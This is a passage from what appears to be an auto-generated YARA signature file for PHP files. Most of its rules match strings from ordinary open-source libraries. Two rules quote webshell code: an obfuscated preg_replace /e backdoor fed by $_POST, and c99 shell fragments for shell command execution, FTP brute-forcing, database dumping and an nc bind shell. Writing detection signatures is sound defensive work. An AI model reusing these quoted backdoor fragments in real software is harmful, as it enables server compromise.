      $s8 = "$matcher = $this->controlGroup($this->matchRadio('foo', 'Foo', 0).$this->matchCheckedRadio('foo2', 'Bar', 1));" fullword ascii
      $s9 = "$matcher  = $this->controlGroup('<input value=\"bar\" id=\"foo\" type=\"radio\" name=\"foo\">');" fullword ascii
      $s10 = "$radios  = $this->former->radios('foo')->radios($this->radioCheckables)->check('foo')->__toString();" fullword ascii
      $s11 = "$radios  = $this->former->radios('foo')->radios(array('Foo' => 'foo', 'Bar' => 'bar'))->__toString();" fullword ascii
      $s12 = "* Matches a checked radio element" fullword ascii
      $s13 = "$matcher = $this->controlGroup($this->matchRadio('foo', 'Foo', 0).$this->matchRadio('bar', 'Bar'));" fullword ascii
      $s14 = "$matcher = $this->controlGroup($this->matchRadio('foo', 'Foo', 0).$this->matchRadio('foo2', 'Bar', 1));" fullword ascii
      $s15 = "$matcher = $this->formGroup($this->matchRadio('foo', 'Foo', 0).$this->matchRadio('foo2', 'Bar', 1));" fullword ascii
      $s16 = "$matcher = $this->controlGroup($this->matchRadio('foo', 'Foo', 0).$this->matchRadio('foo2', 'Bar'));" fullword ascii
      $s17 = "$control = $label ? '<label'.$this->attributes($labelAttr).'>'.$radio.$label.'</label>' : $radio;" fullword ascii
      $s18 = "'<input data-foo=\"bar\" value=\"foo\" id=\"foo\" type=\"radio\" name=\"foo\" checked=\"checked\">'." fullword ascii
      $s19 = "* @param  boolean $inline" fullword ascii
      $s20 = "* @param  integer $value" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule resolve_core
{
   meta:
      description = "php22 - file resolve.core.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d236143fe922215ab879570e9891ca95e37e1c96e59effbd404e1ac4f14db20c"
   strings:
      $s1 = ". \" * This file is managed by the installation process.  Any modifications to it may get overwritten.\\n\"" fullword ascii
      $s2 = "$written= $cacheManager->writeFile($targetFile, $configContent);" fullword ascii
      $s3 = ". \" * Add customizations to the \\$config_options array in `core/config/config.inc.php`.\\n\"" fullword ascii
      $s4 = "if ($targetFile= @ eval($fileMeta['target'])) {" fullword ascii
      $s5 = ". \"define('MODX_CONFIG_KEY', '\" . MODX_CONFIG_KEY . \"');\\n\"" fullword ascii
      $s6 = "if ($cacheManager= $transport->xpdo->getCacheManager()) {" fullword ascii
      $s7 = "$configContent= \"<?php\\n\"" fullword ascii
      $s8 = ". \"define('MODX_CORE_PATH', '\" . MODX_CORE_PATH . \"');\\n\"" fullword ascii
      $s9 = "switch (MODX_SETUP_KEY) {" fullword ascii
      $s10 = "$success= $written !== false ? true : false;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule RecoverableConnectorException
{
   meta:
      description = "php22 - file RecoverableConnectorException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1c709dedf800b1be18796fab389de29bc9d15e4982fd088953428a3039b0dd32"
   strings:
      $s1 = "* The exception that is thrown when a non-fatal error occurs during Connector::fetch." fullword ascii
      $s2 = "namespace ScriptFUSION\\Porter\\Connector;" fullword ascii
      $s3 = "class RecoverableConnectorException extends \\RuntimeException" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ParameterConfirmationTokenTest
{
   meta:
      description = "php22 - file ParameterConfirmationTokenTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c79258684c15b9f6e0d5bed487a4e431d2c3ed7953440d0defe15df995ee462a"
   strings:
      $s1 = "* currentAbsoluteURL needs to handle base or url being missing, or any combination of slashes." fullword ascii
      $s2 = "* There should always be exactly one slash between each part in the result, and any trailing slash" fullword ascii
      $s3 = "$this->assertEquals('value', $this->request->getVar('parameterconfirmationtokentest_notoken'));" fullword ascii
      $s4 = "$this->assertEquals('parameterconfirmationtokentest_backtoken', $token->getName());" fullword ascii
      $s5 = "$this->assertNull($this->request->getVar('parameterconfirmationtokentest_notoken'));" fullword ascii
      $s6 = "use SilverStripe\\Core\\Tests\\Startup\\ParameterConfirmationTokenTest\\ParameterConfirmationTokenTest_ValidToken;" fullword ascii
      $s7 = "$emptyParameter = new ParameterConfirmationTokenTest_Token('parameterconfirmationtokentest_empty', $this->request);" fullword ascii
      $s8 = "$withoutParameter = new ParameterConfirmationTokenTest_Token('parameterconfirmationtokentest_noparam', $this->request);" fullword ascii
      $s9 = "$withToken = new ParameterConfirmationTokenTest_ValidToken('parameterconfirmationtokentest_withtoken', $this->request);" fullword ascii
      $s10 = "$nullToken = new ParameterConfirmationTokenTest_Token('parameterconfirmationtokentest_nulltoken', $this->request);" fullword ascii
      $s11 = "$withoutToken = new ParameterConfirmationTokenTest_Token('parameterconfirmationtokentest_notoken', $this->request);" fullword ascii
      $s12 = "$emptyToken = new ParameterConfirmationTokenTest_Token('parameterconfirmationtokentest_emptytoken', $this->request);" fullword ascii
      $s13 = "$backToken = new ParameterConfirmationTokenTest_Token('parameterconfirmationtokentest_backtoken', $this->request);" fullword ascii
      $s14 = "$this->assertEquals('parameterconfirmationtokentest_empty', $token->getName());" fullword ascii
      $s15 = "$get['parameterconfirmationtokentest_withtokentoken'] = 'dummy';" fullword ascii
      $s16 = "use SilverStripe\\Core\\Tests\\Startup\\ParameterConfirmationTokenTest\\ParameterConfirmationTokenTest_Token;" fullword ascii
      $s17 = "$get['BackURL'] = 'page?parameterconfirmationtokentest_backtoken=1';" fullword ascii
      $s18 = "$get['parameterconfirmationtokentest_nulltokentoken'] = null;" fullword ascii
      $s19 = "$get['parameterconfirmationtokentest_emptytokentoken'] = '';" fullword ascii
      $s20 = "$get['parameterconfirmationtokentest_emptytoken'] = '1';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule ProductOptionValueType
{
   meta:
      description = "php22 - file ProductOptionValueType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "06dbfc2afc21c08851882ce2316605cfda6a6b9878aa83f6b70f201f0cd93e24"
   strings:
      $s1 = "use Sylius\\Bundle\\ResourceBundle\\Form\\EventSubscriber\\AddCodeFormSubscriber;" fullword ascii
      $s2 = "public function getBlockPrefix(): string" fullword ascii
      $s3 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s4 = "use Sylius\\Bundle\\ResourceBundle\\Form\\Type\\ResourceTranslationsType;" fullword ascii
      $s5 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s6 = "use Sylius\\Bundle\\ResourceBundle\\Form\\Type\\AbstractResourceType;" fullword ascii
      $s7 = "namespace Sylius\\Bundle\\ProductBundle\\Form\\Type;" fullword ascii
      $s8 = "->addEventSubscriber(new AddCodeFormSubscriber())" fullword ascii
      $s9 = "return 'sylius_product_option_value';" fullword ascii
      $s10 = "'label' => 'sylius.form.option.name'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule PSR3Test
{
   meta:
      description = "php22 - file PSR3Test.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "caf95fdb30fd5d845087de80dd248dba3ffa5eb2e8024db9e69cab22ad380983"
   strings:
      $s1 = "// Creating a fake environment to execute http requests in." fullword ascii
      $s2 = "* Start the server, trigger an exception and see if the logger captured" fullword ascii
      $s3 = "function testGetNullLoggerByDefault() {" fullword ascii
      $s4 = "$server->getLogger()" fullword ascii
      $s5 = "$this->assertEquals(1, count($logger->logs));" fullword ascii
      $s6 = "// Executing the request." fullword ascii
      $s7 = "'Psr\\Log\\LoggerAwareInterface'," fullword ascii
      $s8 = "$server->setLogger($logger);" fullword ascii
      $s9 = "$logItem = $logger->logs[0];" fullword ascii
      $s10 = "function testSetLogger() {" fullword ascii
      $s11 = "function testIsLoggerAware() {" fullword ascii
      $s12 = "$logger = new MockLogger();" fullword ascii
      $s13 = "'Psr\\Log\\NullLogger'," fullword ascii
      $s14 = "$this->assertEquals(404, $response->getStatus());" fullword ascii
      $s15 = "$server->exec();" fullword ascii
      $s16 = "// We should also see this in the PSR-3 log." fullword ascii
      $s17 = "$logger," fullword ascii
      $s18 = "\\Psr\\Log\\LogLevel::INFO," fullword ascii
      $s19 = "function testLogException() {" fullword ascii
      $s20 = "$logItem[2]['exception']" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule RepoClassGenerator
{
   meta:
      description = "php22 - file RepoClassGenerator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "707e65a2ec1c4e019caef69e051fcd9d00d72f9de03a0bc31e20dcacc340df39"
   strings:
      $s1 = "$template->extendClass('\\\\'.$schema->getBaseRepoClass());" fullword ascii
      $s2 = "use Maghead\\Schema\\DeclareSchema;" fullword ascii
      $s3 = "namespace Maghead\\Generator\\Schema;" fullword ascii
      $s4 = "$template = clone $schema->classes->repo;" fullword ascii
      $s5 = "public static function create(DeclareSchema $schema)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule OkResponseUnitTest
{
   meta:
      description = "php22 - file OkResponseUnitTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "72c9c6ae8f075930d0f51018c1d8ebfb0271130c43e88022553cbdf0da29b934"
   strings:
      $s1 = "* @dataProvider invalidContentValuesProvider" fullword ascii
      $s2 = "* @dataProvider validForwardURLsProvider" fullword ascii
      $s3 = "* @dataProvider validContentValuesProvider" fullword ascii
      $s4 = "* @dataProvider invalidForwardURLsProvider" fullword ascii
      $s5 = "$this->assertEquals($value, $response->getForwardURL());" fullword ascii
      $s6 = "$this->assertEquals($forward_url, $response->getForwardURL());" fullword ascii
      $s7 = "$this->assertEquals($value, $response->getContent());" fullword ascii
      $s8 = "$this->assertEquals($content, $response->getContent());" fullword ascii
      $s9 = "$this->assertEquals(null, $response->getForwardURL());" fullword ascii
      $s10 = "$this->assertEquals('', $response->getContent());" fullword ascii
      $s11 = "$this->assertEquals(['Content-Type' => 'application/json'], $response->getHeaders());" fullword ascii
      $s12 = "* @group HttpService" fullword ascii
      $s13 = "$this->assertEquals(ELGG_HTTP_OK, $response->getStatusCode());" fullword ascii
      $s14 = "public function testThrowsExceptionForInvalidForwardURLs($value) {" fullword ascii
      $s15 = "$status_code = ELGG_HTTP_PARTIAL_CONTENT;" fullword ascii
      $s16 = "$response->setHeaders(['Content-Type' => 'application/json']);" fullword ascii
      $s17 = "* @dataProvider invalidStatusCodesProvider" fullword ascii
      $s18 = "* @dataProvider validStatusCodesProvider" fullword ascii
      $s19 = "$this->assertEquals($value, $response->getStatusCode());" fullword ascii
      $s20 = "$this->assertEquals($status_code, $response->getStatusCode());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}


rule php22_odd
{
   meta:
      description = "php22 - file odd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "41a117dccc8b3231f5c219f72d7e4fd1933469aebf5f36c8a8ddc16d1f8b3a24"
   strings:
      $s1 = "->subcompile($this->getNode('node'))" fullword ascii
      $s2 = "* Checks if a number is odd." fullword ascii
      $s3 = "* This file is part of Twig." fullword ascii
      $s4 = "*  {{ var is odd }}" fullword ascii
      $s5 = "public function compile(Twig_Compiler $compiler)" fullword ascii
      $s6 = "class Twig_Node_Expression_Test_Odd extends Twig_Node_Expression_Test" fullword ascii
      $s7 = "$compiler" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_qiang9
{
   meta:
      description = "php22 - file qiang9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "62bae8e544bf5c1bd18f0cb5023adda0bd9a758f34a3ffe3bffe1a3fe46b12b7"
   strings:
      $s1 = "$gzid(\"/[discuz]/e\",$_POST['h'],\"Access\");" fullword ascii
      $s2 = "$gzid = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_pusher
{
   meta:
      description = "php22 - file pusher.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fe700cbb8c5c8ee9b8d038f34c8bede3c34079a5c1cec8d5f973fedd71a3d9b"
   strings:
      $s1 = "$pusher->writeError($exception->getMessage());" fullword ascii
      $s2 = "function ($error, $message, $file, $line) use ($pusher) {" fullword ascii
      $s3 = "if (error_reporting() !== 0) {" fullword ascii
      $s4 = "require_once __DIR__ . '/../../classes/autoloader.php';" fullword ascii
      $s5 = "exit($exception->getCode());" fullword ascii
      $s6 = "namespace mageekguy\\atoum\\scripts;" fullword ascii
      $s7 = "$pusher->writeError($message);" fullword ascii
      $s8 = "set_error_handler(" fullword ascii
      $s9 = "$pusher->run();" fullword ascii
      $s10 = "$pusher = new git\\pusher(__FILE__);" fullword ascii
      $s11 = "exit($error);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}


rule RepoShardTrait
{
   meta:
      description = "php22 - file RepoShardTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "246b3ed510a1cad1e21c26be061cef734f53e20435f51e186203632f93e04e70"
   strings:
      $s1 = "* This method returns an array of object that has \"key\" property and \"cnt_of_rows\" property." fullword ascii
      $s2 = "$stm = $this->write->prepare(\"SELECT {$shardKey} AS shardKey, COUNT({$shardKey}) AS numberOfRows FROM {$table} GROUP BY " fullword ascii
      $s3 = "$stm->execute();" fullword ascii
      $s4 = "* Fetches the distinct shard key in the repo." fullword ascii
      $s5 = "* Fetch the stats of each shard key" fullword ascii
      $s6 = "$stm->setFetchMode(PDO::FETCH_CLASS, 'Maghead\\\\Sharding\\\\ShardKeyStat', [$this]);" fullword ascii
      $s7 = "use Maghead\\Sharding\\ShardKeyStat;" fullword ascii
      $s8 = "return $this->select(\"DISTINCT {$shardKey}\")->fetchColumn(0);" fullword ascii
      $s9 = "namespace Maghead\\Sharding\\Traits;" fullword ascii
      $s10 = "public function fetchShardKeys()" fullword ascii
      $s11 = "public function fetchShardKeyStats()" fullword ascii
      $s12 = "shardKey ORDER BY numberOfRows ASC\");" fullword ascii
      $s13 = "$shardKey = static::SHARD_KEY;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule options_register
{
   meta:
      description = "php22 - file options-register.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "58b4bd1b31460853a8ffad416150b8bbc63173d473d355581f727509255509ca"
   strings:
      $s1 = "* Register JS variables used by theme options admin Javascript." fullword ascii
      $s2 = "http://www.gnu.org/licenses/old-licenses/gpl-2.0.html GNU General Public License, v2 (or newer)" fullword ascii
      $s3 = "$custom_field_name = 'theme_' . upfw_get_current_theme_id() . '_options[' . $attr['name'] . ']';" fullword ascii
      $s4 = "$fieldname = \"theme_\" . ( upfw_get_current_theme_id() ) . \"_options[{$optionname}]\";" fullword ascii
      $s5 = "if( isset( $_GET['page']) && esc_attr( $_GET['page'] ) == 'upfw-settings' && $selected_tab )" fullword ascii
      $s6 = "* options within the UpThemes Framework." fullword ascii
      $s7 = "* Register Global Admin Javascript Variables" fullword ascii
      $s8 = "* This file implements the WordPress Settings API for the" fullword ascii
      $s9 = "ID of the Settings page section to which to add the setting field; passed from add_settings_section()" fullword ascii
      $s10 = "* Loop through each Theme Settings page tab, and add" fullword ascii
      $s11 = "http://codex.wordpress.org/Function_Reference/add_settings_field" fullword ascii
      $s12 = "http://codex.wordpress.org/Function_Reference/add_settings_section" fullword ascii
      $s13 = "* setting field to the Theme Settings page for each" fullword ascii
      $s14 = "* a new section to the Theme Settings page for each" fullword ascii
      $s15 = "Name of the Settings page to which to add the setting field; passed from add_settings_section()" fullword ascii
      $s16 = "* Callback for get_settings_field()" fullword ascii
      $s17 = "* Loop through each Theme option, and add a new" fullword ascii
      $s18 = "Name of the Settings page to which to add the section; passed to do_settings_sections()" fullword ascii
      $s19 = "* Globalize the variable that holds" fullword ascii
      $s20 = "* section specified for each tab." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule QueryOptionsTest
{
   meta:
      description = "php22 - file QueryOptionsTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6ba1c93f8456e461af726737e9ccfe248332818469eeb0afb5cc1623496a67a1"
   strings:
      $s1 = "$messages = _elgg_services()->logger->enable();" fullword ascii
      $s2 = "_elgg_services()->logger->disable();" fullword ascii
      $s3 = "public function testNormalizesPrivateSettingOptionsOnMultipleRuns() {" fullword ascii
      $s4 = "$this->assertEquals(new WhereClause(\"foo.baz = 'baz'\"), $options['wheres'][2]);" fullword ascii
      $s5 = "$this->assertEquals(new WhereClause(\"foo.bar = 'bar'\"), $options['wheres'][1]);" fullword ascii
      $s6 = "$dbprefix = elgg_get_config('dbprefix');" fullword ascii
      $s7 = "$this->assertEquals(new SelectClause('foo.baz'), $options['selects'][2]);" fullword ascii
      $s8 = "$this->assertEquals(new SelectClause('foo.bar'), $options['selects'][1]);" fullword ascii
      $s9 = "/* @var $pair \\Elgg\\Database\\Clauses\\RelationshipWhereClause */" fullword ascii
      $s10 = "public function testNormalizesPrivateSettingOptionsForMultipleMixedPairs() {" fullword ascii
      $s11 = "$this->assertEquals(2, count($options['private_setting_name_value_pairs']));" fullword ascii
      $s12 = "$this->assertEquals(3, count($options['private_setting_name_value_pairs']));" fullword ascii
      $s13 = "$this->assertEquals(1, count($options['private_setting_name_value_pairs']));" fullword ascii
      $s14 = "$this->assertNotEmpty($messages);" fullword ascii
      $s15 = "$this->assertNotEmpty($options);" fullword ascii
      $s16 = "/* @var $clause \\Elgg\\Database\\Clauses\\GroupByClause */" fullword ascii
      $s17 = "/* @var $clause \\Elgg\\Database\\Clauses\\HavingClause */" fullword ascii
      $s18 = "/* @var $clause \\Elgg\\Database\\Clauses\\OrderByClause */" fullword ascii
      $s19 = "public function testNormalizesPrivateSettingOptionsFromPlurals() {" fullword ascii
      $s20 = "public function testNormalizesPrivateSettingOptionsForMultiplePairs() {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule redhgaajcee_login_passl
{
   meta:
      description = "php22 - file redhgaajcee_login_passl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x3 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $x4 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x5 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $x6 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x7 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x8 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath); @unlink($srcpath);}" fullword ascii
      $x9 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath);  @unlink($srcpath);}" fullword ascii
      $x10 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x11 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $x12 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}" fullword ascii
      $x13 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $x14 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x15 = "$sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s16 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s17 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s18 = "if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s19 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s20 = "echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($sq" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}


rule Promotion
{
   meta:
      description = "php22 - file Promotion.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0328db34eda4035f2d8d075f70c8ea9c7f55b7cbba48e2ebc8d762500ab6125e"
   strings:
      $s1 = "* When exclusive, promotion with top priority will be applied" fullword ascii
      $s2 = "* Cannot be applied together with other promotions" fullword ascii
      $s3 = "* @var Collection|PromotionActionInterface[]" fullword ascii
      $s4 = "* @var Collection|PromotionCouponInterface[]" fullword ascii
      $s5 = "* @var Collection|PromotionRuleInterface[]" fullword ascii
      $s6 = "public function getUsageLimit(): ?int" fullword ascii
      $s7 = "public function getDescription(): ?string" fullword ascii
      $s8 = "public function getActions(): Collection" fullword ascii
      $s9 = "public function getCoupons(): Collection" fullword ascii
      $s10 = "* @var \\DateTimeInterface" fullword ascii
      $s11 = "public function getEndsAt(): ?\\DateTimeInterface" fullword ascii
      $s12 = "public function getRules(): Collection" fullword ascii
      $s13 = "public function setUsageLimit(?int $usageLimit): void" fullword ascii
      $s14 = "public function getStartsAt(): ?\\DateTimeInterface" fullword ascii
      $s15 = "public function setDescription(?string $description): void" fullword ascii
      $s16 = "use Sylius\\Component\\Resource\\Model\\TimestampableTrait;" fullword ascii
      $s17 = "$this->priority = null === $priority ? -1 : $priority;" fullword ascii
      $s18 = "$this->usageLimit = $usageLimit;" fullword ascii
      $s19 = "public function getCode(): ?string" fullword ascii
      $s20 = "public function getPriority(): int" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}


rule refresh_site
{
   meta:
      description = "php22 - file refresh_site.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4f9bf6ef80cd0e682a14e0798c9cc30d7feeed6f99c8bf294fcb707deb6bb6e0"
   strings:
      $s1 = "$modx->smarty->assign('unpublished',$modx->lexicon('refresh_unpublished',array('num' => $num_rows_unpub)));" fullword ascii
      $s2 = "$num_rows_unpub = isset($results['publishing']['unpublished']) ? $results['publishing']['unpublished'] : 0;" fullword ascii
      $s3 = "$modx->smarty->assign('published',$modx->lexicon('refresh_published',array('num' => $num_rows_pub)));" fullword ascii
      $s4 = "if (!$modx->hasPermission('empty_cache')) return $modx->error->failure($modx->lexicon('permission_denied'));" fullword ascii
      $s5 = "* @subpackage manager.controllers" fullword ascii
      $s6 = "return $modx->smarty->fetch('system/refresh_site.tpl');" fullword ascii
      $s7 = "$num_rows_pub = isset($results['publishing']['published']) ? $results['publishing']['published'] : 0;" fullword ascii
      $s8 = "* @package modx" fullword ascii
      $s9 = "$modx->invokeEvent('OnSiteRefresh');" fullword ascii
      $s10 = "/* invoke OnSiteRefresh event */" fullword ascii
      $s11 = "* Refreshes the site cache" fullword ascii
      $s12 = "$modx->invokeEvent('OnBeforeCacheUpdate');" fullword ascii
      $s13 = "$modx->smarty->assign('results', $results);" fullword ascii
      $s14 = "$this->checkFormCustomizationRules();" fullword ascii
      $s15 = "/* invoke OnBeforeCacheUpdate event */" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule parsehtml
{
   meta:
      description = "php22 - file parsehtml.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9e3df8ec362d2b35d1e4f4df093a426734b702505d56af48b389a6721666e18e"
   strings:
      $s1 = "* - pi (processing instruction)" fullword ascii
      $s2 = "* @license LGPL, see LICENSE_LGPL.txt and the summary below" fullword ascii
      $s3 = "* @author Milian Wolff (mail@milianw.de, http://milianw.de)" fullword ascii
      $s4 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s5 = "* @param string $type see description for $this->nodeType" fullword ascii
      $s6 = "* get next node, set $this->html prior!" fullword ascii
      $s7 = "* current node content, i.e. either a" fullword ascii
      $s8 = "* count this to get current depth" fullword ascii
      $s9 = "* - comment" fullword ascii
      $s10 = "* - tag (see isStartTag)" fullword ascii
      $s11 = "* - text (includes cdata)" fullword ascii
      $s12 = "# dont truncate whitespaces for <code> or <pre> contents" fullword ascii
      $s13 = "# html 4 allows something like <option selected> instead of <option selected=\"selected\">" fullword ascii
      $s14 = "* wether current node is an opening tag (<a>) or not (</a>)" fullword ascii
      $s15 = "* wether current node is an empty tag (<br />) or not (<a></a>)" fullword ascii
      $s16 = "* supress HTML tags inside preformatted tags (see above)" fullword ascii
      $s17 = "* parseHTML is a HTML parser which works with PHP 4 and above." fullword ascii
      $s18 = "* TODO: what shall we do with <del> and <ins> ?!" fullword ascii
      $s19 = "* It tries to handle invalid HTML to some degree." fullword ascii
      $s20 = "* @param int $pos to which position shall we cut?" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule RelatedProduct
{
   meta:
      description = "php22 - file RelatedProduct.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "337f70b2abb5d8a37cfe5df6add6b07e8149227b169483d221f7aae0b361be50"
   strings:
      $s1 = "ActiveRecordHelper::getCommonTag(\\app\\modules\\shop\\models\\RelatedProduct::className())," fullword ascii
      $s2 = "* @property string $viewFile" fullword ascii
      $s3 = "if (false !== $cache = \\Yii::$app->cache->get($cacheKey)) {" fullword ascii
      $s4 = "* @property array $additional" fullword ascii
      $s5 = "* @property Product $product" fullword ascii
      $s6 = "ActiveRecordHelper::getObjectTag(get_class($product), $this->product->id)," fullword ascii
      $s7 = "namespace app\\modules\\shop\\widgets;" fullword ascii
      $s8 = "$product = \\Yii::$container->get(Product::class);" fullword ascii
      $s9 = "use yii\\base\\Widget;" fullword ascii
      $s10 = "use devgroup\\TagDependencyHelper\\ActiveRecordHelper;" fullword ascii
      $s11 = "'products' => $this->product->relatedProducts," fullword ascii
      $s12 = "class RelatedProduct extends Widget" fullword ascii
      $s13 = "if (!$this->product instanceof Product) {" fullword ascii
      $s14 = "use app\\modules\\shop\\models\\Product;" fullword ascii
      $s15 = "$result = $this->render($this->viewFile, [" fullword ascii
      $s16 = "public $viewFile = 'related-product/list';" fullword ascii
      $s17 = "$cacheKey = 'RelatedProduct:' . implode('_', [" fullword ascii
      $s18 = "'additional' => $this->additional," fullword ascii
      $s19 = "parent::run();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ProductAssociationTypeRepository
{
   meta:
      description = "php22 - file ProductAssociationTypeRepository.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "526d3c407eb0ee4e9d3698aaacf59143734116b38c107f69a1a087e8231a3cf9"
   strings:
      $s1 = "use Sylius\\Component\\Product\\Repository\\ProductAssociationTypeRepositoryInterface;" fullword ascii
      $s2 = "class ProductAssociationTypeRepository extends EntityRepository implements ProductAssociationTypeRepositoryInterface" fullword ascii
      $s3 = "use Sylius\\Bundle\\ResourceBundle\\Doctrine\\ORM\\EntityRepository;" fullword ascii
      $s4 = "public function createListQueryBuilder(string $locale): QueryBuilder" fullword ascii
      $s5 = "namespace Sylius\\Bundle\\ProductBundle\\Doctrine\\ORM;" fullword ascii
      $s6 = "public function findByName(string $name, string $locale): array" fullword ascii
      $s7 = "->getResult()" fullword ascii
      $s8 = "->getQuery()" fullword ascii
      $s9 = "->innerJoin('o.translations', 'translation')" fullword ascii
      $s10 = "->andWhere('translation.name = :name')" fullword ascii
      $s11 = "use Doctrine\\ORM\\QueryBuilder;" fullword ascii
      $s12 = "return $this->createQueryBuilder('o')" fullword ascii
      $s13 = "->andWhere('translation.locale = :locale')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RequestLocaleSetterSpec
{
   meta:
      description = "php22 - file RequestLocaleSetterSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a9c6a652c69b721c747400442cebcc8ed4603ee265a3bfde31efa433bbf699cc"
   strings:
      $s1 = "use Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent;" fullword ascii
      $s2 = "function let(LocaleContextInterface $localeContext, LocaleProviderInterface $localeProvider): void" fullword ascii
      $s3 = "$localeProvider->getDefaultLocaleCode()->willReturn('en_US');" fullword ascii
      $s4 = "$localeContext->getLocaleCode()->willReturn('pl_PL');" fullword ascii
